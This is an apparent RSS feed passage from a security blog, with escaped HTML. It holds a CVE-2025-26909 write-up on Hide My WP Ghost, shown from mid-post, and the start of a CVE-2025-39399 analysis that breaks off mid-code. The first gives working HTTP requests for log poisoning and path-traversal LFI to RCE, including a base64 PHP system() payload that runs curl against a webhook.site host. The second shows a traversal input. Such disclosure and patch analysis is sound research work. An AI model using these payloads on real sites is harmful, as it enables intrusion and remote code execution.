home  lib  lib64  lost&amp;#43;found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  swap.img&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;log-poisoning--lfi--rce&#34;&gt;&lt;span&gt;Log poisoning → LFI → RCE&lt;/span&gt;&#xA;  &lt;a href=&#34;#log-poisoning--lfi--rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Send a request with PHP code placed in the &lt;code&gt;User-Agent&lt;/code&gt; header&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Send a request with the LFI payload pointing to &lt;code&gt;/var/log/apache2/other_vhosts_access.log&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result2.png&#34;&#xA;    alt=&#34;Successful LFI =&amp;gt; RCE result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI =&amp;gt; RCE result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Explanation&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log&#xA;127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 &amp;#43;0700] &amp;#34;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&amp;#34; 403 2844 &amp;#34;-&amp;#34; &amp;#34;Mozilla/5.0 (X11; Ubuntu; &amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When &lt;code&gt;include()&lt;/code&gt; loads a file, PHP will execute any PHP code (&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;) contained in the file before returning. The payload is Base64-encoded and decoded at include time with &lt;code&gt;base64_decode&lt;/code&gt; to avoid escaping issues with quotes (&lt;code&gt;&amp;quot;&lt;/code&gt; → &lt;code&gt;\&amp;quot;&lt;/code&gt;) when the logger writes it. The decoded command becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -I &amp;#39;https://webhook.site/bac7e163-b475-4323-a315-acd010359640&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, &lt;code&gt;system()&lt;/code&gt; runs this command and returns its output.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;Note: although &lt;code&gt;base64_decode&lt;/code&gt; may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hide My WP Ghost version &lt;strong&gt;≤ 5.4.01&lt;/strong&gt; allows LFI because the plugin reconstructs a path and then &lt;code&gt;include()&lt;/code&gt;s it without canonicalization/whitelisting. By combining log‑poisoning and a payload containing &lt;code&gt;/wp-activate.php/?&lt;/code&gt;, an attacker can escalate LFI to RCE in some configurations. The issue is fixed in &lt;strong&gt;5.4.02&lt;/strong&gt; by sanitizing the URL before returning.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not directly include&lt;/strong&gt; data from requests.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;strong&gt;realpath() / basename() / whitelist / base_dir checks&lt;/strong&gt; before including.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; is not sufficient to prevent traversal.&lt;/li&gt;&#xA;&lt;li&gt;Log poisoning (User‑Agent, Referer…) can create an inclusionable payload source — do not log raw content that might later be included.&lt;/li&gt;&#xA;&lt;li&gt;Fixes must combine: sanitize + canonicalize + directory restriction + control over log write permissions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hide-my-wp/vulnerability/wordpress-hide-my-wp-ghost-plugin-5-4-01-local-file-inclusion-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Hide My WP Ghost Plugin &amp;lt;= 5.4.01 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39399 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-17-cve-2025-39399/</link>
      <pubDate>Fri, 17 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-17-cve-2025-39399/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;License For Envato&lt;/strong&gt; plugin version &lt;strong&gt;≤ 1.0.0&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt; without authentication, thereby including or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39399&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39399&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/license-envato/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress License For Envato Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;License For Envato&lt;/strong&gt;: &lt;strong&gt;1.0.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.1.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/compare tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php $action = isset( $_GET[&amp;#39;tab&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;tab&amp;#39;] ) : &amp;#39;general&amp;#39;; ?&amp;gt;&#xA;    // other logic&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        $template = &amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;;&#xA;    }&#xA;&#xA;    if ( file_exists( $template ) ) {&#xA;        include $template;&#xA;    }else{&#xA;        include &amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;;&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the value of &lt;code&gt;$action&lt;/code&gt; is taken directly from &lt;code&gt;$_GET[&#39;tab&#39;]&lt;/code&gt;. Although this value is passed through &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, that function only strips HTML tags — &lt;strong&gt;it does not prevent path traversal sequences like &lt;code&gt;../&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, an attacker can supply a value such as &lt;code&gt;?tab=../../somefile&lt;/code&gt;, causing &lt;code&gt;$action&lt;/code&gt; to contain an unexpected path. When this value is concatenated into &lt;code&gt;$template&lt;/code&gt; and then &lt;code&gt;include&lt;/code&gt;d =&amp;gt; LFI occurs.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// Exit if accessed directly&#xA;defined(&amp;#39;ABSPATH&amp;#39;) || exit;&#xA;&#xA;// Define allowed tab values to prevent LFI&#xA;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;// Apply filter to allow extensions to add their own tabs&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&#xA;&#xA;// Verify nonce if tab parameter is set&#xA;$action = &amp;#39;general&amp;#39;;&#xA;if (isset($_GET[&amp;#39;tab&amp;#39;])) {&#xA;    // Verify nonce for tab switching if provided&#xA;    if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_text_field(wp_unslash($_GET[&amp;#39;_wpnonce&amp;#39;])), &amp;#39;license_envato_switch_tab&amp;#39;)) {&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    } elseif (!isset($_GET[&amp;#39;_wpnonce&amp;#39;])) {&#xA;        // If no nonce is provided, still allow tab switching but sanitize input&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    }&#xA;}&#xA;?&amp;gt;&#xA;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        // Ensure we only include files within the plugin directory structure&#xA;        $template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;        $nav_view_dir = realpath($licenseEnvato_nav_view);&#xA;        &#xA;        // Verify the template is a child of the nav view directory to prevent path traversal&#xA;        if ($template &amp;amp;&amp;amp; $nav_view_dir &amp;amp;&amp;amp; strpos($template, $nav_view_dir) === 0 &amp;amp;&amp;amp; file_exists($template)) {&#xA;            include $template;&#xA;        } else {&#xA;            // Fallback to general.php with the same security checks&#xA;            $general_template = 